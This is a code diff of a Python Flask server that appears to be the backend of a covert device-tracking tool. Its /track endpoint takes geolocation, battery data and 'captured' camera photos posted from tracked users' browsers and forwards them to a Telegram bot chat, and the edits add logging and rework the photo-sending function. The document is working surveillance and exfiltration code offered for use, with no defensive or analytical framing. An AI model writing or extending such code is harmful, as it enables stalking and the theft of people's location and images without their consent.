@@ -17,7 +17,7 @@ TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 tracked_users = {}
 
 def send_telegram_message(text):
-    """Send a text message to Telegram bot."""
+    """Send text message to Telegram bot."""
     payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
     try:
         response = requests.post(TELEGRAM_API, json=payload)
@@ -25,11 +25,11 @@ def send_telegram_message(text):
     except Exception as e:
         print("❌ Error sending message:", str(e))
 
-def send_telegram_photo(photo_base64, caption):
-    """Send a base64-encoded image to Telegram bot."""
+def send_telegram_photo(image_url, caption):
+    """Send an image to Telegram bot."""
+    payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
     try:
-        photo_data = {"chat_id": CHAT_ID, "caption": caption, "photo": f"data:image/jpeg;base64,{photo_base64}"}
-        response = requests.post(TELEGRAM_PHOTO_API, json=photo_data)
+        response = requests.post(TELEGRAM_PHOTO_API, json=payload)
         print("📷 Photo Response:", response.text)  # ✅ Debugging
     except Exception as e:
         print("❌ Error sending photo:", str(e))
@@ -40,7 +40,7 @@ def home():
 
 @app.route('/track/<session_id>', methods=['POST', 'OPTIONS'])
 def track_device(session_id):
-    """Track users and send data to Telegram."""
+    """Track multiple users and send data to Telegram."""
     if request.method == "OPTIONS":
         response = jsonify({"status": "CORS Preflight OK"})
         response.headers["Access-Control-Allow-Origin"] = "*"
@@ -49,11 +49,14 @@ def track_device(session_id):
         return response, 200
 
     try:
-        data = request.json
-        print("📥 Received Data:", data)  # ✅ Debugging
+        print("📥 Received request for tracking!")  # Debugging
 
+        data = request.get_json()
         if not data:
+            print("❌ Error: No JSON received!")
             return jsonify({"error": "Invalid JSON data"}), 400
+
+        print("📦 Full Data:", json.dumps(data, indent=2))  # Log full request
 
         battery = data.get("battery", {})
         geo = data.get("geo", {})
@@ -87,18 +90,22 @@ def track_device(session_id):
 
         # ✅ Handle Photo
         if photo:
-            send_telegram_photo(photo, "📷 Captured Photo")
+            try:
+                print("📸 Received Photo (First 100 chars):", photo[:100])
+                send_telegram_photo(photo, "📷 Captured Photo")
+            except Exception as e:
+                print("❌ Error sending photo:", str(e))
 
         response = jsonify({"status": "success"})
         response.headers["Access-Control-Allow-Origin"] = "*"
         return response, 200
 
     except Exception as e:
-        print("❌ Error:", str(e))  # ✅ Debugging
+        print("❌ Critical Error:", str(e))
         response = jsonify({"error": str(e)})
         response.headers["Access-Control-Allow-Origin"] = "*"
         return response, 500
 
 if __name__ == '__main__':
-    port = int(os.getenv("PORT", 5000))  # ✅ Use Render-assigned PORT or default 5000
+    port = int(os.getenv("PORT", 10000))  # ✅ Use Render-assigned PORT or default 10000
     app.run(host='0.0.0.0', port=port)
